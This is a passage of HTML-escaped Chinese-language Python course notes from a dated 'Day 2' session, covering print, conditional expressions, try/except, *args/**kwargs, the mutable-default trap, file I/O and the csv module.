所以 python 鼓勵使用 &lt;code&gt;break&lt;/code&gt; 和 &lt;code&gt;continue&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;The else Clause on Loops (while, for)&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;loops&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面的迴圈如果沒有被 &lt;code&gt;break&lt;/code&gt; 提前結束的話&lt;br /&gt;
就會進入 &lt;code&gt;else&lt;/code&gt;&lt;br /&gt;
可以用來取代平常設定的 flag  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 - 2013.03.10&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://j.mp/mosky-python"&gt;今日投影片&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://j.mp/mosky-py"&gt;最新版投影片&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;print&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;print 'Print', 'multiple'&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Print 和 multiple 中間會有空白  &lt;ul&gt;
&lt;li&gt;在 python2 裏面拿不掉  &lt;/li&gt;
&lt;li&gt;可以用 &lt;code&gt;sys&lt;/code&gt; 裏面的 &lt;code&gt;write&lt;/code&gt; 代替就沒有空白  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;印一個新行  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;python2 會印一對括號  &lt;/li&gt;
&lt;li&gt;python3 會印一個新行  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print('End with a space.', end='')&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;會把最後因為逗號出現的空白去掉  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print('A', 'B', 'C', sep=',')&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sep&lt;/code&gt; 預設是一個空白  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Sequence Comparison&lt;/h2&gt;
&lt;p&gt;python 裏面沒有字元 只有長度為1的字串&lt;br /&gt;
所以 &lt;code&gt;'A' &amp;gt; 65&lt;/code&gt; 是 &lt;code&gt;True&lt;/code&gt;&lt;br /&gt;
通常不會拿 字串 和 整數 做比較&lt;br /&gt;
在 python3 裏面用 seq 跟不是 seq 的型態比較會出現 type error  &lt;/p&gt;
&lt;h2&gt;if-else 補充 (類似 Ternary 的用法)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Python 中並沒有 C 的 &lt;code&gt;?:&lt;/code&gt; (ternary operator)，但可以用下面這寫法來達到  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;[exp. if conditon true] if [condition] else [exp. if condition false]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是說，C 裡頭的  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等同於 Python 裡頭的  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;try&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python2  &lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;LookupError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;IndexError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;KeyError&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python3  &lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;LookupError&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;IndexError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;KeyError&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;避免使用 &lt;code&gt;Exception&lt;/code&gt; (所有 exceptions 的父類別, 會抓到所有的例外)  &lt;ul&gt;
&lt;li&gt;除非是在頂層, 如果 except 後面不寫東西, 也是代表抓所有的例外  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;try&lt;/code&gt; 裏面的 code 要儘量減少, 儘量把要執行的 code 放在 else  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;finally&lt;/code&gt; 用來寫意外發生的時候要如何善後的code  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;raise KeyError('xxxxx')&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;def&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;定義一個function  &lt;/li&gt;
&lt;li&gt;如果沒寫回傳值的話，會回傳&lt;code&gt;None&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;unpack 用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;y&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# *args 代表接受任意長度的參數  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# 回傳一個 tuple  &lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# **kargs 可以接受 keyword argument  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;kargs&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 回傳一個 key 和 value 對應的 dictionary  &lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kargs&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Syntax Error, 特定的argument要放在 *args 前面  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="c1"&gt;# 接收所有的參數  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kargs&lt;/span&gt; &lt;span class="c1"&gt;# 可以透過這樣的寫法  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 將所有參數原封不動傳給另外一個function  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 最好是 hack 別人的 library 或是  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 要修正自己的 function 時再用  &lt;/span&gt;

&lt;span class="c1"&gt;# def statement in python3  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# python3 比較彈性 這樣寫不會噴 syntax error  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 但 k 只能用 keyword argument 指定  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# 因為所有 position 指定的方式都會被 *args 吃掉  &lt;/span&gt;

&lt;span class="c1"&gt;# python functions are first-class functions  &lt;/span&gt;
&lt;span class="c1"&gt;# you can pass functions as arguments and assign functions to variables  &lt;/span&gt;
&lt;span class="c1"&gt;# like function pointer in c  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;A trap of the default value&lt;/h3&gt;
&lt;p&gt;參見 &lt;code&gt;ex_defval_trap.py&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這是新手很容易遇到的一個問題之一&lt;br /&gt;
list 是在 function define 的時候就建立了, 不是在 function 被 called 的時候&lt;br /&gt;
所以 &lt;code&gt;list = []&lt;/code&gt; 這個方式並不會在每次呼叫該 function 的時候把 list 清空&lt;br /&gt;
只有在該 fuction 第一次被呼叫時，該 list 會是空的&lt;br /&gt;
所以避免用 Mutable types 來當 default value&lt;br /&gt;
如果要用的話 可以使用類似下面這種方式  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="c1"&gt;# 這樣就可以每次把list清空  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Swap two variables in Python&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="c1"&gt;# x == 1 , y == 2  &lt;/span&gt;
&lt;span class="c1"&gt;# 可用 y, x = x, y 直接做 swap  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;File object&lt;/h2&gt;
&lt;h3&gt;Read&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  

&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Write&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;output.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a line.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 要記得加換行符  &lt;/span&gt;
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;csv module&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;csv&lt;/span&gt;  

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ex_csv.csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
    &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Documentation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/2/"&gt;http://docs.python.org/2/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/3/"&gt;http://docs.python.org/3/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;help($name)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dir($name)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;'\n'.join(dir($name))&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pydoc $name&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Your Documentation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以自己寫 pydoc 說明自己寫的東西  &lt;/li&gt;
